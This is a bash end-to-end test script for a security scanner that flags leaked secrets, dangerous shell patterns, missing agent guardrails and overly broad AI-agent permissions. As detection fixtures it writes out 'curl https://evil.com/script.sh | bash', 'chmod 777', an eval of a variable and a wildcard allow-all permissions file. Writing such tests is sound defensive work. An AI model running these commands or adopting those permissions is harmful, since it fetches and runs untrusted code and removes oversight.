#!/usr/bin/env bash
# F40-delta-e2e.sh — TAP-compatible E2E tests for Delta security scanners

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"

TMPDIR_ROOT="$(mktemp -d)"
export DIDIO_PROJECT_ROOT="$TMPDIR_ROOT"
trap 'rm -rf "$TMPDIR_ROOT"' EXIT

mkdir -p "$TMPDIR_ROOT/logs/agents"
mkdir -p "$TMPDIR_ROOT/logs/warroom/cards"
mkdir -p "$TMPDIR_ROOT/.claude"
cat > "$TMPDIR_ROOT/didio.config.json" <<'CONF'
{"meta_agents":{"blackhawk_delta":{"enabled":true,"scan_interval_minutes":30}}}
CONF

source "$PROJECT_ROOT/lib/delta-security.sh"

PASS=0; FAIL=0; TOTAL=0
tap() {
  TOTAL=$((TOTAL + 1))
  if [[ "$1" == "ok" ]]; then PASS=$((PASS + 1)); echo "ok $TOTAL - $2"
  else FAIL=$((FAIL + 1)); echo "not ok $TOTAL - $2"; fi
}

# ---------------------------------------------------------------------------
# 1-2: Secrets scanner
# ---------------------------------------------------------------------------

# Create a .env file
echo "DB_PASSWORD=s3cret" > "$TMPDIR_ROOT/.env"

_delta_scan_secrets

if [[ "$_DELTA_SECRETS_STATUS" == "critical" ]]; then
  tap "ok" "secrets scanner: .env file detected as critical"
else
  tap "not ok" "secrets scanner: expected critical (got: $_DELTA_SECRETS_STATUS)"
fi

# Remove secret, should be clean
rm -f "$TMPDIR_ROOT/.env"

_delta_scan_secrets

if [[ "$_DELTA_SECRETS_STATUS" == "ok" ]]; then
  tap "ok" "secrets scanner: clean project -> ok"
else
  tap "not ok" "secrets scanner: expected ok (got: $_DELTA_SECRETS_STATUS)"
fi

# ---------------------------------------------------------------------------
# 3-4: Shell patterns scanner
# ---------------------------------------------------------------------------

mkdir -p "$TMPDIR_ROOT/bin"
cat > "$TMPDIR_ROOT/bin/dangerous.sh" <<'EOF'
#!/usr/bin/env bash
curl https://evil.com/script.sh | bash
chmod 777 /tmp/open
EOF

_delta_scan_shell

if [[ "$_DELTA_SHELL_STATUS" == "warning" ]]; then
  tap "ok" "shell scanner: dangerous patterns detected"
else
  tap "not ok" "shell scanner: expected warning (got: $_DELTA_SHELL_STATUS)"
fi

# Check specific findings
if echo "$_DELTA_SHELL_FINDINGS" | python3 -c "import json,sys; fs=json.load(sys.stdin); sys.exit(0 if any('curl' in f.get('detail','') for f in fs) else 1)" 2>/dev/null; then
  tap "ok" "shell scanner: curl|bash detected"
else
  tap "not ok" "shell scanner: curl|bash detection"
fi

rm -rf "$TMPDIR_ROOT/bin"

# ---------------------------------------------------------------------------
# 5-6: Guardrails scanner
# ---------------------------------------------------------------------------

# No CLAUDE.md -> critical
_delta_scan_guardrails

if [[ "$_DELTA_GUARDRAILS_STATUS" == "critical" ]]; then
  tap "ok" "guardrails scanner: missing CLAUDE.md -> critical"
else
  tap "not ok" "guardrails scanner: expected critical (got: $_DELTA_GUARDRAILS_STATUS)"
fi

# Create a complete CLAUDE.md
cat > "$TMPDIR_ROOT/CLAUDE.md" <<'EOF'
# CLAUDE.md
## Guardrails
- NUNCA rodar git rebase em branches compartilhadas
- NUNCA rodar git push --force
- NUNCA usar --no-verify
- NUNCA usar git add -A
- NUNCA commitar secrets
- NUNCA rodar rm -rf sem confirmar
EOF

_delta_scan_guardrails

if [[ "$_DELTA_GUARDRAILS_STATUS" == "ok" ]]; then
  tap "ok" "guardrails scanner: complete CLAUDE.md -> ok"
else
  tap "not ok" "guardrails scanner: expected ok (got: $_DELTA_GUARDRAILS_STATUS)"
fi

# ---------------------------------------------------------------------------
# 7-8: Permissions scanner
# ---------------------------------------------------------------------------

# Create permissive settings
cat > "$TMPDIR_ROOT/.claude/settings.json" <<'EOF'
{"permissions":{"defaultMode":"auto","allow":["*"]}}
EOF

_delta_scan_permissions

if [[ "$_DELTA_PERMS_STATUS" == "warning" ]]; then
  tap "ok" "permissions scanner: auto mode + broad allow -> warning"
else
  tap "not ok" "permissions scanner: expected warning (got: $_DELTA_PERMS_STATUS)"
fi

# Restrictive settings
cat > "$TMPDIR_ROOT/.claude/settings.json" <<'EOF'
{"permissions":{"defaultMode":"normal","allow":["Read","Glob"]}}
EOF

_delta_scan_permissions

if [[ "$_DELTA_PERMS_STATUS" == "ok" ]]; then
  tap "ok" "permissions scanner: restrictive settings -> ok"
else
  tap "not ok" "permissions scanner: expected ok (got: $_DELTA_PERMS_STATUS)"
fi

# ---------------------------------------------------------------------------
# 9-10: Report + cards
# ---------------------------------------------------------------------------

# Set up findings: create dangerous script
mkdir -p "$TMPDIR_ROOT/bin"
echo 'eval "$DANGEROUS"' > "$TMPDIR_ROOT/bin/bad.sh"

delta_scan_all --dry-run > /dev/null 2>&1 || true

report_files=("$TMPDIR_ROOT"/logs/agents/delta-report-*.json)
if [[ -e "${report_files[0]}" ]]; then
  tap "ok" "report JSON written"
else
  tap "not ok" "report JSON written"
fi

card_files=("$TMPDIR_ROOT"/logs/warroom/cards/*.json)
if [[ ! -e "${card_files[0]}" ]]; then
  tap "ok" "dry-run does NOT create cards"
else
  tap "not ok" "dry-run creates cards (should not)"
fi

# Non-dry-run
delta_scan_all > /dev/null 2>&1 || true

card_files=("$TMPDIR_ROOT"/logs/warroom/cards/*.json)
if [[ -e "${card_files[0]}" ]]; then
  source_agent="$(python3 -c "
import json, sys
with open(sys.argv[1], 'r') as f:
    print(json.load(f).get('source_agent', ''))
" "$(_delta_native_path "${card_files[0]}")")"
  if [[ "$source_agent" == "blackhawk-delta" ]]; then
    tap "ok" "non-dry-run creates cards with source_agent=blackhawk-delta"
  else
    tap "not ok" "card source_agent (got: $source_agent)"
  fi
else
  tap "not ok" "non-dry-run creates cards (found 0)"
fi

# ---------------------------------------------------------------------------
echo ""
echo "1..$TOTAL"
echo "# pass $PASS / $TOTAL"
if [[ $FAIL -gt 0 ]]; then echo "# FAIL $FAIL test(s) failed"; exit 1; fi
echo "# All tests passed"; exit 0
